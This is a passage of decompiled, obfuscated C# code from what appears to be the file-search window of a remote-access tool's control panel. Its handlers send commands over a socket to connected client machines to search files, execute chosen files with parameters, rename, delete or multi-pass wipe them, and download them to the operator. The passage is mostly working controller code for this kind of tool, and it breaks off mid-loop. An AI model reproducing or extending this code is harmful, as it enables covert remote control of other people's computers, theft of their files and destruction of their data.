	internal void vmethod_99(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_6 = toolStripSeparator_7;
	}

	// Token: 0x0600192E RID: 6446 RVA: 0x0000CA33 File Offset: 0x0000AC33
	internal ToolStripMenuItem vmethod_100()
	{
		return this.toolStripMenuItem_24;
	}

	// Token: 0x0600192F RID: 6447 RVA: 0x000B57F4 File Offset: 0x000B39F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_24);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_24;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_24 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_24;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001930 RID: 6448 RVA: 0x0000CA3B File Offset: 0x0000AC3B
	internal ToolStripStatusLabel vmethod_102()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x06001931 RID: 6449 RVA: 0x0000CA43 File Offset: 0x0000AC43
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(ToolStripStatusLabel toolStripStatusLabel_4)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_4;
	}

	// Token: 0x06001932 RID: 6450 RVA: 0x0000CA4C File Offset: 0x0000AC4C
	internal BackgroundWorker vmethod_104()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06001933 RID: 6451 RVA: 0x000B5838 File Offset: 0x000B3A38
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_28);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_2;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001934 RID: 6452 RVA: 0x0000CA54 File Offset: 0x0000AC54
	internal BackgroundWorker vmethod_106()
	{
		return this.backgroundWorker_1;
	}

	// Token: 0x06001935 RID: 6453 RVA: 0x000B587C File Offset: 0x000B3A7C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_27);
		BackgroundWorker backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_1 = backgroundWorker_2;
		backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001936 RID: 6454 RVA: 0x0000CA5C File Offset: 0x0000AC5C
	internal ToolStripStatusLabel vmethod_108()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x06001937 RID: 6455 RVA: 0x0000CA64 File Offset: 0x0000AC64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(ToolStripStatusLabel toolStripStatusLabel_4)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_4;
	}

	// Token: 0x06001938 RID: 6456 RVA: 0x0000CA6D File Offset: 0x0000AC6D
	internal ToolStripMenuItem vmethod_110()
	{
		return this.toolStripMenuItem_25;
	}

	// Token: 0x06001939 RID: 6457 RVA: 0x000B58C0 File Offset: 0x000B3AC0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_30);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_25 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600193A RID: 6458 RVA: 0x0000CA75 File Offset: 0x0000AC75
	internal VisualButton vmethod_112()
	{
		return this.visualButton_0;
	}

	// Token: 0x0600193B RID: 6459 RVA: 0x000B5904 File Offset: 0x000B3B04
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_33);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_2;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600193C RID: 6460 RVA: 0x0000CA7D File Offset: 0x0000AC7D
	internal VisualButton vmethod_114()
	{
		return this.visualButton_1;
	}

	// Token: 0x0600193D RID: 6461 RVA: 0x000B5948 File Offset: 0x000B3B48
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_34);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_2;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600193E RID: 6462 RVA: 0x000B598C File Offset: 0x000B3B8C
	private void fSearch_Load(object sender, EventArgs e)
	{
		this.vmethod_6().VirtualMode = true;
		this.vmethod_6().View = View.Details;
		this.vmethod_6().FullRowSelect = true;
		this.vmethod_6().OwnerDraw = true;
		this.vmethod_6().UseCellFormatEvents = true;
		this.vmethod_6().Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
		this.vmethod_6().Columns[0].Width = 180;
		this.vmethod_6().Columns[1].Width = 60;
		this.vmethod_6().Columns[2].Width = 80;
		this.vmethod_6().Columns[3].Width = 60;
		this.vmethod_6().Columns[4].Width = 120;
		this.vmethod_6().Columns[5].Width = 300;
		this.vmethod_6().Columns[6].Width = 160;
		this.vmethod_6().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_104().RunWorkerAsync();
		this.Text = string.Concat(new string[]
		{
			"Search files - ",
			this.string_4,
			"^",
			this.string_6,
			" - ",
			this.string_7
		});
		this.method_6();
	}

	// Token: 0x0600193F RID: 6463 RVA: 0x000B5B08 File Offset: 0x000B3D08
	public void method_0(string string_8)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate194(this.method_0), new object[]
			{
				string_8
			});
			return;
		}
		this.string_2 = string_8;
		this.vmethod_24().Text = string_8;
		this.vmethod_14().Text = "Current path: " + string_8;
	}

	// Token: 0x06001940 RID: 6464 RVA: 0x000B5B64 File Offset: 0x000B3D64
	public void method_1(string string_8)
	{
		if (this.vmethod_2().InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate195(this.method_1), new object[]
			{
				string_8
			});
			return;
		}
		this.vmethod_102().Text = "Searched: " + string_8;
	}

	// Token: 0x06001941 RID: 6465 RVA: 0x000B5BB4 File Offset: 0x000B3DB4
	public void method_2(string string_8)
	{
		if (this.vmethod_2().InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate196(this.method_2), new object[]
			{
				string_8
			});
			return;
		}
		this.vmethod_34().Text = "Status: " + string_8;
		this.vmethod_114().Text = "Search";
		this.vmethod_114().Enabled = true;
		this.vmethod_24().Enabled = true;
		this.vmethod_30().Enabled = true;
		this.vmethod_112().Enabled = true;
	}

	// Token: 0x06001942 RID: 6466 RVA: 0x000B5C44 File Offset: 0x000B3E44
	public void method_3(string string_8, string string_9, string string_10, string string_11, string string_12, string string_13, string string_14, string string_15)
	{
		if (this.vmethod_6().InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate198(this.method_3), new object[]
			{
				string_8,
				string_9,
				string_10,
				string_11,
				string_12,
				string_13,
				string_14,
				string_15
			});
			return;
		}
		cFileSearch item = new cFileSearch(string_8, string_9, string_10, string_11, string_12, string_13, string_15);
		this.concurrentStack_0.Push(item);
	}

	// Token: 0x06001943 RID: 6467 RVA: 0x000B5CBC File Offset: 0x000B3EBC
	public void method_4()
	{
		if (this.vmethod_6().InvokeRequired)
		{
			this.vmethod_6().Invoke(new fSearch.Delegate193(this.method_4), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_6().AddObjects(this.concurrentStack_0.ToList<cFileSearch>());
			this.concurrentStack_0.Clear();
			this.vmethod_16().Text = "Items: " + Conversions.ToString(this.vmethod_6().Items.Count);
		}
	}

	// Token: 0x06001944 RID: 6468 RVA: 0x000B5D50 File Offset: 0x000B3F50
	public void method_5(bool bool_0, string string_8)
	{
		if (this.vmethod_114().InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate192(this.method_5), new object[]
			{
				bool_0,
				string_8
			});
			return;
		}
		this.vmethod_114().Text = "Search";
		this.vmethod_114().Enabled = true;
		this.vmethod_24().Enabled = true;
		this.vmethod_30().Enabled = true;
		this.vmethod_112().Enabled = true;
		this.vmethod_34().Text = Conversions.ToString(Interaction.IIf(bool_0, "Status: Search completed", "Status: Search stopped"));
		this.vmethod_24().Text = this.string_2;
		this.vmethod_14().Text = "Current path: N/A";
		this.vmethod_102().Text = "Searched: " + string_8;
	}

	// Token: 0x06001945 RID: 6469 RVA: 0x0000CA85 File Offset: 0x0000AC85
	public void method_6()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate197(this.method_6), new object[0]);
			return;
		}
		base.Visible = true;
		this.vmethod_106().RunWorkerAsync();
	}

	// Token: 0x06001946 RID: 6470 RVA: 0x000B5E28 File Offset: 0x000B4028
	public void method_7(string string_8, string string_9, string string_10, string string_11, string string_12, string string_13)
	{
		this.string_4 = string_8;
		this.string_6 = string_9;
		this.string_5 = string_10;
		this.string_7 = string_11;
		this.string_0 = string_13;
		this.string_1 = string_12;
		this.string_2 = string_12;
		this.vmethod_24().Text = string_12;
	}

	// Token: 0x06001947 RID: 6471 RVA: 0x000B5E78 File Offset: 0x000B4078
	public void method_8(string string_8)
	{
		if (this.vmethod_24().InvokeRequired)
		{
			this.vmethod_24().Invoke(new fSearch.Delegate191(this.method_8), new object[]
			{
				string_8
			});
			return;
		}
		this.string_1 = string_8;
		this.vmethod_14().Text = string_8;
	}

	// Token: 0x06001948 RID: 6472 RVA: 0x0000CABB File Offset: 0x0000ACBB
	public void method_9()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate200(this.method_9), new object[0]);
			return;
		}
		this.int_0 = 0;
		base.Opacity = (double)this.int_0;
		base.Visible = false;
	}

	// Token: 0x06001949 RID: 6473 RVA: 0x000B5EC8 File Offset: 0x000B40C8
	private void method_10(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_114().Text, "Search", true) == 0)
		{
			this.concurrentStack_0.Clear();
			this.vmethod_6().ClearObjects();
			Class130.concurrentDictionary_3[this.string_0].SCREEN_IS_STREAMING = true;
			string text = this.string_0;
			string text2 = "files_search|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_24().Text)) + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_30().Text));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			this.vmethod_34().Text = "Status: Search started";
			this.vmethod_24().Enabled = false;
			this.vmethod_30().Enabled = false;
			this.vmethod_114().Text = "Stop";
			return;
		}
		if (Operators.CompareString(this.vmethod_114().Text, "Stop", true) == 0)
		{
			this.vmethod_114().Enabled = false;
			string text4 = this.string_0;
			string text2 = "files_search_stop|1";
			string text3 = text4;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x0600194A RID: 6474 RVA: 0x000B60A4 File Offset: 0x000B42A4
	private void method_11(object sender, EventArgs e)
	{
		this.vmethod_16().Text = "Items: " + Conversions.ToString(this.vmethod_6().Items.Count);
		this.vmethod_108().Text = "Selected: " + Conversions.ToString(this.vmethod_6().SelectedObjects.Count);
	}

	// Token: 0x0600194B RID: 6475 RVA: 0x0000CAFA File Offset: 0x0000ACFA
	private void fSearch_Closing(object sender, CancelEventArgs e)
	{
		this.method_9();
		e.Cancel = true;
	}

	// Token: 0x0600194C RID: 6476 RVA: 0x000B6108 File Offset: 0x000B4308
	private void method_12(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		try
		{
			IEnumerator enumerator = fastObjectListView.SelectedObjects.GetEnumerator();
			if (enumerator.MoveNext())
			{
				text = ((cFileSearch)enumerator.Current).TAG;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (Operators.CompareString(text, string.Empty, true) == 0)
		{
			Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
		ConcurrentDictionary<string, CClient> concurrentDictionary_;
		string key;
		CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_0];
		string text3 = string.Concat(new string[]
		{
			"files_exec|",
			text,
			"|",
			text2,
			"|1"
		});
		long num = 0L;
		ref string ptr = ref text3;
		ref CClient ptr2 = ref value;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary_[key] = value;
	}

	// Token: 0x0600194D RID: 6477 RVA: 0x000B62C4 File Offset: 0x000B44C4
	private void method_13(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		try
		{
			IEnumerator enumerator = fastObjectListView.SelectedObjects.GetEnumerator();
			if (enumerator.MoveNext())
			{
				text = ((cFileSearch)enumerator.Current).TAG;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (Operators.CompareString(text, string.Empty, true) == 0)
		{
			Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text2 = Interaction.InputBox("Enter new file name", Application.ProductName, string.Empty, -1, -1);
		if (Operators.CompareString(text2, string.Empty, true) == 0)
		{
			Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		int num = 0;
		ref int ptr = ref num;
		ref string ptr2 = ref text2;
		string empty = string.Empty;
		string text3 = ptr2;
		bool flag;
		if (!Information.IsNothing(ptr))
		{
			IEnumerable<char> source = text3.Intersect(Path.GetInvalidFileNameChars());
			if (source.Any<char>())
			{
				ptr = checked(Strings.Len(empty) + text3.IndexOf(source.First<char>()));
				flag = false;
			}
			else
			{
				source = empty.Intersect(Path.GetInvalidPathChars());
				if (source.Any<char>())
				{
					ptr = empty.IndexOf(source.First<char>());
					flag = false;
				}
				else
				{
					flag = true;
				}
			}
		}
		else
		{
			flag = (!text3.Intersect(Path.GetInvalidFileNameChars()).Any<char>() && !empty.Intersect(Path.GetInvalidPathChars()).Any<char>());
		}
		if (flag)
		{
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text4 = "files_rename|" + text + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
			long num2 = 0L;
			ref string ptr3 = ref text4;
			ref CClient ptr4 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr3 += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr3);
				ptr4.sock_async.method_6(bytes);
				CClient cclient = ptr4;
				ref double ptr5 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr5 + (double)ptr3.Length;
				ptr5 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr5 + (double)ptr3.Length;
				ptr5 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr5 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
		else
		{
			Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
		}
	}

	// Token: 0x0600194E RID: 6478 RVA: 0x000B656C File Offset: 0x000B476C
	private void method_14(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Delete selected " + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + " file(s)? [Normal delete]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			string text = string.Empty;
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_delete_normal|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x0600194F RID: 6479 RVA: 0x000B6734 File Offset: 0x000B4934
	private void method_15(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + " file(s)? [7 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			string text = "7|";
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_delete_secure|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x06001950 RID: 6480 RVA: 0x000B68FC File Offset: 0x000B4AFC
	private void method_16(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + " file(s)? [3 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			text = "3|";
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_delete_secure|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x06001951 RID: 6481 RVA: 0x000B6AC8 File Offset: 0x000B4CC8
	private void method_17(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + " file(s)? [2 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			text = "2|";
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_delete_secure|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x06001952 RID: 6482 RVA: 0x000B6C94 File Offset: 0x000B4E94
	private void method_18(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + " file(s)? [1 Pass]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			text = "2|";
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_delete_secure|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x06001953 RID: 6483 RVA: 0x000B6E60 File Offset: 0x000B5060
	private void method_19(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			Class130.fTransferManager_0.Visible = true;
			Form fTransferManager_ = Class130.fTransferManager_0;
			bool flag = false;
			Form form = fTransferManager_;
			Rectangle rectangle;
			if (this != null)
			{
				rectangle = this.RectangleToScreen(this.ClientRectangle);
			}
			else
			{
				rectangle = Screen.FromPoint(form.Location).WorkingArea;
			}
			checked
			{
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fTransferManager_0.Opacity = 100.0;
				Class130.fTransferManager_0.Activate();
			}
			try
			{
				foreach (cFileSearch cFileSearch in fastObjectListView.SelectedObjects)
				{
					ConcurrentDictionary<string, CClient> concurrentDictionary_;
					string key;
					CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_0];
					string text = string.Concat(new string[]
					{
						"files_download|",
						this.string_0,
						"|",
						cFileSearch.TAG,
						"|0"
					});
					long num = 0L;
					ref string ptr = ref text;
					ref CClient ptr2 = ref value;
					try
					{
						if (num > 0L)
						{
							Thread.Sleep(checked((int)(num * 60000L)));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_3;
						Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_5;
						Class130.struct20_0.double_5 = ptr3 + 1.0;
					}
					catch (Exception ex)
					{
					}
					concurrentDictionary_[key] = value;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001954 RID: 6484 RVA: 0x000B70C0 File Offset: 0x000B52C0
	private void method_20(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("Add selected file(s) (" + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + ") to ZIP?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			Class130.concurrentDictionary_3[this.string_0].fDB.vmethod_156().Tag = cFileSearch.NAME + ".zip";
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
